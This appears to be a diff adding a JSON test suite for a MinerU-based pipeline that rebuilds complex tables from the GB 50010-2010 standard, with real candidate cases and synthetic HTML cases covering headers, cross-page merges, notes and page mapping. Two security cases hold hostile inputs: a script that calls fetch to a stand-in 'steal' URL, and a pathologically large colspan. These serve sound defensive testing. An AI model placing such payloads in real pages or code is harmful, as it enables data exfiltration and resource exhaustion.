@@ -1,0 +1,367 @@
+{
+  "test_suite_id": "engineering-rag-task1.3-complex-tables-v2.4",
+  "purpose": "MinerU-based engineering standard table reconstruction, layout, cross-page merge and frozen schema safety",
+  "source_policy": {
+    "local_only": true,
+    "do_not_default_parse_full_document": true,
+    "public_schema_is_frozen": "2.4"
+  },
+  "real_document": {
+    "standard": "GB 50010-2010 (2015 edition)",
+    "expected_original_pdf_pages": 441,
+    "source_pdf_sha256": "43048a647d595fc8e16545851491bab82d3df851b91fe227ba2f7f84f5b64682"
+  },
+  "real_candidates_are_not_ground_truth": true,
+  "real_cases": [
+    {
+      "case_id": "GB-T352",
+      "case_kind": "real_candidate",
+      "original_physical_pages": [
+        28,
+        29
+      ],
+      "candidate_table_number": "3.5.2",
+      "focus": [
+        "续表标识",
+        "重复表头",
+        "来源行",
+        "表注"
+      ],
+      "status": "succeeded_pending_human_review",
+      "gold_truth": null,
+      "gold_truth_status": "candidate_pending_human_review"
+    },
+    {
+      "case_id": "GB-T4222",
+      "case_kind": "real_candidate",
+      "original_physical_pages": [
+        37,
+        38
+      ],
+      "candidate_table_number": "4.2.2-2",
+      "focus": [
+        "多级表头",
+        "跨行跨列",
+        "跨页列拓扑"
+      ],
+      "status": "succeeded_pending_human_review",
+      "gold_truth": null,
+      "gold_truth_status": "candidate_pending_human_review"
+    },
+    {
+      "case_id": "GB-T912",
+      "case_kind": "real_candidate",
+      "original_physical_pages": [
+        126,
+        127
+      ],
+      "candidate_table_number": "9.1.2",
+      "focus": [
+        "续表",
+        "新条文边界",
+        "表格结束位置"
+      ],
+      "status": "succeeded_pending_human_review",
+      "gold_truth": null,
+      "gold_truth_status": "candidate_pending_human_review"
+    }
+  ],
+  "synthetic_cases": [
+    {
+      "case_id": "S01",
+      "name": "单页基本表",
+      "kind": "positive",
+      "html": "<table><tr><th>参数</th><th>数值</th></tr><tr><td>强度等级</td><td>C30</td></tr></table>",
+      "expect": {
+        "grid_rows": 2,
+        "grid_cols": 2,
+        "grid_complete": true,
+        "business_strings": [
+          "C30"
+        ],
+        "should_reject": false
+      }
+    },
+    {
+      "case_id": "S02",
+      "name": "多级表头的 rowspan colspan",
+      "kind": "positive",
+      "html": "<table><thead><tr><th rowspan=\"2\">类别</th><th colspan=\"2\">限值</th></tr><tr><th>下限</th><th>上限</th></tr></thead><tbody><tr><td>A</td><td>1.0</td><td>2.0</td></tr></tbody></table>",
+      "expect": {
+        "grid_rows": 3,
+        "grid_cols": 3,
+        "grid_complete": true,
+        "header_paths": [
+          [
+            "类别"
+          ],
+          [
+            "限值",
+            "下限"
+          ],
+          [
+            "限值",
+            "上限"
+          ]
+        ],
+        "should_reject": false
+      }
+    },
+    {
+      "case_id": "S03",
+      "name": "纵向数据合并",
+      "kind": "positive",
+      "html": "<table><tr><th>工况</th><th>荷载</th></tr><tr><td rowspan=\"2\">长期</td><td>120kN</td></tr><tr><td>90kN</td></tr></table>",
+      "expect": {
+        "grid_rows": 3,
+        "grid_cols": 2,
+        "grid_complete": true,
+        "merged_data_cell": {
+          "row": 1,
+          "col": 0,
+          "row_span": 2
+        },
+        "flat_continuation_value": null,
+        "should_reject": false
+      }
+    },
+    {
+      "case_id": "S04",
+      "name": "工程原值不能数字化",
+      "kind": "positive",
+      "html": "<table><tr><th>值</th><th>说明</th></tr><tr><td>≥0.05</td><td>MPa</td></tr><tr><td>1.0</td><td>—</td></tr></table>",
+      "expect": {
+        "business_strings": [
+          "≥0.05",
+          "MPa",
+          "1.0",
+          "—"
+        ],
+        "no_numeric_cast": true,
+        "should_reject": false
+      }
+    },
+    {
+      "case_id": "S05",
+      "name": "有真实编号的两条表注",
+      "kind": "positive",
+      "html": "<table><tr><th>参数</th><th>值</th></tr><tr><td>厚度</td><td>100</td></tr></table>",
+      "observed_note_texts": [
+        "注：1 厚度单位为 mm。",
+        "注：2 仅用于示例。"
+      ],
+      "expect": {
+        "notes": [
+          {
+            "number": 1,
+            "content": "厚度单位为 mm。"
+          },
+          {
+            "number": 2,
+            "content": "仅用于示例。"
+          }
+        ],
+        "should_reject": false
+      }
+    },
+    {
+      "case_id": "S06",
+      "name": "无编号表注不能虚构编号",
+      "kind": "positive",
+      "html": "<table><tr><th>项目</th><th>值</th></tr><tr><td>A</td><td>5</td></tr></table>",
+      "observed_note_texts": [
+        "注：数值仅为示意。"
+      ],
+      "expect": {
+        "notes": null,
+        "unnumbered_note_in_sidecar": true,
+        "should_reject": false
+      }
+    },
+    {
+      "case_id": "S07",
+      "name": "相邻页面同号明确续表",
+      "kind": "positive",
+      "fragments": [
+        {
+          "physical_page": 10,
+          "caption": "表 3.5.2 试验表",
+          "html": "<table><tr><th>类别</th><th>数值</th></tr><tr><td>A</td><td>1</td></tr></table>"
+        },
+        {
+          "physical_page": 11,
+          "caption": "续表 3.5.2",
+          "html": "<table><tr><th>类别</th><th>数值</th></tr><tr><td>B</td><td>2</td></tr></table>"
+        }
+      ],
+      "expect": {
+        "should_merge": true,
+        "fragment_count": 2,
+        "data_rows": 2,
+        "duplicate_header_data_rows": 0,
+        "should_reject": false
+      }
+    },
+    {
+      "case_id": "S08",
+      "name": "相邻页不同表号禁止合并",
+      "kind": "negative_merge",
+      "fragments": [
+        {
+          "physical_page": 10,
+          "caption": "表 3.5.2",
+          "html": "<table><tr><th>类别</th><th>值</th></tr><tr><td>A</td><td>1</td></tr></table>"
+        },
+        {
+          "physical_page": 11,
+          "caption": "表 3.5.3",
+          "html": "<table><tr><th>类别</th><th>值</th></tr><tr><td>B</td><td>2</td></tr></table>"
+        }
+      ],
+      "expect": {
+        "should_merge": false,
+        "reason": "different_table_number"
+      }
+    },
+    {
+      "case_id": "S09",
+      "name": "相邻页列头显著冲突",
+      "kind": "negative_merge",
+      "fragments": [
+        {
+          "physical_page": 10,
+          "caption": "表 2.1",
+          "html": "<table><tr><th>项目</th><th>直径</th></tr><tr><td>A</td><td>10</td></tr></table>"
+        },
+        {
+          "physical_page": 11,
+          "caption": "续表 2.1",
+          "html": "<table><tr><th>类型</th><th>长度</th><th>体积</th></tr><tr><td>B</td><td>20</td><td>30</td></tr></table>"
+        }
+      ],
+      "expect": {
+        "should_merge": false,
+        "reason": "incompatible_columns"
+      }
+    },
+    {
+      "case_id": "S10",
+      "name": "只有页邻接无续表证据",
+      "kind": "negative_merge",
+      "fragments": [
+        {
+          "physical_page": 10,
+          "caption": null,
+          "html": "<table><tr><th>项目</th><th>值</th></tr><tr><td>A</td><td>1</td></tr></table>"
+        },
+        {
+          "physical_page": 11,
+          "caption": null,
+          "html": "<table><tr><th>项目</th><th>值</th></tr><tr><td>B</td><td>2</td></tr></table>"
+        }
+      ],
+      "expect": {
+        "should_merge": false,
+        "reason": "insufficient_positive_evidence"
+      }
+    },
+    {
+      "case_id": "S11",
+      "name": "续页重复表头不算数据",
+      "kind": "positive",
+      "same_input_as": "S07",
+      "expect": {
+        "duplicate_header_data_rows": 0,
+        "repeated_header_preserved_in_raw_sidecar": true
+      }
+    },
+    {
+      "case_id": "S12",
+      "name": "HTML 部分行缺格",
+      "kind": "negative_grid",
+      "html": "<table><tr><th>A</th><th>B</th></tr><tr><td>x</td></tr></table>",
+      "expect": {
+        "no_phantom_cell": true,
+        "cannot_claim_lossless_complete_if_holes": true
+      }
+    },
+    {
+      "case_id": "S13",
+      "name": "恶意外链脚本不执行",
+      "kind": "security",
+      "html": "<script>fetch(\"https://example.invalid/steal\")</script><table><tr><td><img src=\"https://example.invalid/x\"></td></tr></table>",
+      "expect": {
+        "network_requests": 0,
+        "script_execution": false,
+        "can_return_diagnostic": true
+      }
+    },
+    {
+      "case_id": "S14",
+      "name": "一块中有两个 table 标签",
+      "kind": "negative_grid",
+      "html": "<table><tr><td>A</td></tr></table><table><tr><td>B</td></tr></table>",
+      "expect": {
+        "must_not_silently_merge": true,
+        "raw_preserved": true
+      }
+    },
+    {
+      "case_id": "S15",
+      "name": "病态大 colspan",
+      "kind": "security",
+      "html": "<table><tr><td colspan=\"999999999\">X</td></tr></table>",
+      "expect": {
+        "resource_bounded": true,
+        "reject_or_block": true
+      }
+    },
+    {
+      "case_id": "S16",
+      "name": "只有文字识别无格网",
+      "kind": "missing_source",
+      "ocr_text": "表 1.2 A B 12 34",
+      "table_bbox": null,
+      "expect": {
+        "must_not_invent_bbox": true,
+        "must_not_claim_complete_raw_grid": true
+      }
+    },
+    {
+      "case_id": "S17",
+      "name": "跨页原始页映射错误",
+      "kind": "negative_mapping",
+      "selected_pdf_page_index_to_original_page": {
+        "0": 28,
+        "1": 29
+      },
+      "faulty_block_page": 2,
+      "expect": {
+        "do_not_use_local_page_index_as_original": true,
+        "detect_invalid_source_page": true
+      }
+    },
+    {
+      "case_id": "S18",
+      "name": "元数据字段数值与文本类型",
+      "kind": "contract",
+      "business_values": [
+        "1.0",
+        "0.05",
+        null
+      ],
+      "source_page": 28,
+      "source_block_id": "p028_table001",
+      "expect": {
+        "data_values_preserve_strings": true,
+        "source_page_is_integer": true,
+        "source_block_id_is_string": true
+      }
+    }
+  ],
+  "notes": [
+    "合成HTML用于不依赖MinerU的逻辑测试；不是从GB扫描PDF提取的OCR实测结果。",
+    "真实案例只有人工核实后才可转为金标；未运行时为not_run。",
+    "实现必须读取冻结 V2.4 的实际字段定义，禁止为通过测试修改 contracts。"
+  ]
+}
